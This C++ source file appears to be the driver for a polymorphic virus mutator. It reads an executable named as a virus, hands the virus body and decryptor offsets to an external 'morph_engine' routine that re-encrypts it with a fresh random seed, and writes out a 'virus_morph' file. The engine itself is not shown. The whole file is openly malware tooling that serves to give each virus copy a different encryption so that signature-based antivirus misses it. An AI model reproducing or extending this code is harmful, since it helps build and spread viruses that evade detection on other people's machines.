
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <iostream>
#include <fstream>

extern "C" int morph_engine(char* exe_data, size_t virus_beg_offset, size_t virus_size, size_t dec_offset);
using namespace std;
int main(int argc, char* argv[])
{


    if(argc != 5) {

        cout << "Invalid number of arguments!" << endl;
        return 1;
    }

	// seeding rand with current time for unique encryption
	srand(time(NULL));

	// get the arguments
	const char* virus_name = argv[1];
	const size_t virus_offset  = strtoull(argv[2], nullptr, 16);
	const size_t virus_size    = strtoull(argv[3], nullptr, 16);
	const size_t dec_offset  = strtoull(argv[4], nullptr, 16);


	// open the executable file
	FILE* exe_file = fopen(virus_name, "rb");
	if(!exe_file)
	{
		cout << "Error opening " <<  virus_offset << endl;
		return 1;
	}

	// get the size of the executable file
	size_t exe_size;
	fseek(exe_file, 0, SEEK_END);
	exe_size = ftell(exe_file);
	rewind(exe_file);


    char* exe_data =  (char *) malloc(exe_size);
    fread(exe_data, exe_size, 1, exe_file);
    if(morph_engine(exe_data, virus_offset, virus_size, dec_offset) != 0)
	{
		cout << "Encoutered errors in the morph engine" << endl;

	}


    std::ofstream outfile ("virus_morph",std::ofstream::binary);
    // write to outfile
    outfile.write (exe_data,exe_size);



    return 0;
}

// https://stackoverflow.com/questions/22129349/reading-binary-file-to-unsigned-char-array-and-write-it-to-another
// https://stackoverflow.com/questions/43765881/c-reading-binary-files
// http://www.cplusplus.com/forum/beginner/176692/